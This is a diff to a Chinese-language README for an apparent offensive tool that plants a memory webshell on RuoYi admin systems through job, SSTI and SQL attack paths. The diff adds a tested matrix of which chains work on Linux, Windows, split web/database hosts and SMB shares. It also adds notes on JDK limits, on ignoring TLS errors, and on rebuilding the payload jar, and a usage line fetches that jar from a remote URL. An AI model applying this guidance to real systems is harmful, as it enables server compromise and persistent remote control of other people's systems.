@@ -56,6 +56,23 @@ java -jar ruoyi-gzms.jar ... --mode ssti --jar-url http://镜像/g.jar --drop-to
 
 要求目标账号有 `monitor:cache:view` 权限（admin 默认有）。机制、字符禁区、坑位见技能库 `references/ssti-chain.md`。
 
+## 部署/OS 适配矩阵（实测结论）
+
+| 场景 | job 链 | ssti + jar加载(http/file/UNC) | ssti `--inline` | ssti `--drop-to` |
+|---|---|---|---|---|
+| 站库一体 Linux | ✅ | ✅ | ✅ | ✅（secure_file_priv 空→/tmp；默认锁目录则需 app 可读） |
+| 站库一体 Windows | ✅ | ✅ | ✅ | ✅（Windows MySQL secure_file_priv 多为空 → `C:/...`） |
+| 站库分离（任意 OS） | ✅ | ✅ | ✅ | ❌ 文件落 DB 机盘，web 机读不到 |
+| Windows + 内网未授权 SMB | ✅ | ✅ UNC 直拉 `\\\\host\\share\\g.jar`（走系统 SMB） | ✅ | — |
+| Linux 无出网无共享 | ✅（file: 已落盘路径） | ✅ file: | ✅ | 视同机条件 |
+
+通用注意事项：
+- **JDK 8-14**（SSTI 链依赖 Nashorn `js` 引擎；JDK 15+ 移除了 Nashorn，`--mode ssti` 不可用，job 链不受影响）。RuoYi 4.7.5 常规部署就是 JDK8
+- Windows 路径/盘符/UNC 反斜杠已在工具内转义处理；路径含双引号会被拒（罕见）
+- **CLI 默认忽略 TLS 证书错误**（自签/代理 MITM 全放行），https 目标直接打
+- cookie 过期/无效：三条路径（job、ssti、sql）都会报 `session invalid/expired — re-login or refresh --cookie`
+- 换 `--gz-pass/--gz-key` 需重打载荷 jar（xc=md5(key)[0:16] 派生）；`--inline` 自动从 jar 提类，重打后照常
+
 要求 JRE 8+，无其他依赖。Windows 同样：`java -jar ruoyi-gzms.jar --url ... --user ... --pass ...`。
 
 ## Windows curl 快速验证
